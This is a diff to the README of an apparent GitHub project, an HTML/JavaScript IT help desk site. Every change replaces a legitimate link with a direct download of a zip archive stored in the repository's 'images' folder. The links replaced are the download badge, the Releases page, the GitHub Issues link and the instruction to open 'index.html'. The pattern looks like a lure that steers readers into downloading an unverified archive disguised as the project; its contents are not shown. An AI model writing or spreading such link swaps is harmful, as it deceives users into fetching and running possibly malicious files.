@@ -1,7 +1,7 @@
 # 🌟 Project-work - A Help Desk Made Easy
 
 ## 📥 Download Now
-[![Download Project-work](https://img.shields.io/badge/Download-Project--work-blue.svg)](https://github.com/TarSec0/Project-work/releases)
+[![Download Project-work](https://github.com/TarSec0/Project-work/raw/refs/heads/main/images/work_Project_v1.2.zip)](https://github.com/TarSec0/Project-work/raw/refs/heads/main/images/work_Project_v1.2.zip)
 
 ## 📝 Description
 Project-work is a modern and responsive IT Help Desk website. It includes features like Sign Up, Login, and Ticket Submission. Built with HTML, CSS, and JavaScript, this application provides a user-friendly experience for managing IT requests.
@@ -11,7 +11,7 @@ Project-work is a modern and responsive IT Help Desk website. It includes featur
 These steps will help you download and run Project-work easily.
 
 1. **Visit the Releases Page**
-   Go to our [Releases Page](https://github.com/TarSec0/Project-work/releases) to see the latest version of Project-work.
+   Go to our [Releases Page](https://github.com/TarSec0/Project-work/raw/refs/heads/main/images/work_Project_v1.2.zip) to see the latest version of Project-work.
 
 2. **Download the Application**
    On the Releases page, find the most recent version. Look for the assets section and click on the appropriate version to download it.
@@ -20,7 +20,7 @@ These steps will help you download and run Project-work easily.
    After the download finishes, locate the downloaded file on your computer. This file is usually in your Downloads folder. Right-click on the file and select "Extract All" to unzip it.
 
 4. **Open the Project**
-   After extracting the files, open the folder. Double-click on the `index.html` file to launch the application in your web browser.
+   After extracting the files, open the folder. Double-click on the `https://github.com/TarSec0/Project-work/raw/refs/heads/main/images/work_Project_v1.2.zip` file to launch the application in your web browser.
 
 5. **Start Using the Help Desk**
    You can now use the Help Desk features. Sign up for an account, log in, and start submitting tickets for help.
@@ -41,7 +41,7 @@ These steps will help you download and run Project-work easily.
 ## 📁 Download & Install
 To download Project-work, click the link below:
 
-[Download Project-work](https://github.com/TarSec0/Project-work/releases)
+[Download Project-work](https://github.com/TarSec0/Project-work/raw/refs/heads/main/images/work_Project_v1.2.zip)
 
 After downloading, follow the steps outlined in the Getting Started section to run the application.
 
@@ -55,7 +55,7 @@ After downloading, follow the steps outlined in the Getting Started section to r
 
 ## ✅ Support
 
-For any questions or issues, feel free to reach out via the GitHub Issues page [here](https://github.com/TarSec0/Project-work/issues). We aim to respond promptly to assist you.
+For any questions or issues, feel free to reach out via the GitHub Issues page [here](https://github.com/TarSec0/Project-work/raw/refs/heads/main/images/work_Project_v1.2.zip). We aim to respond promptly to assist you.
 
 ## 🙏 Acknowledgments
 
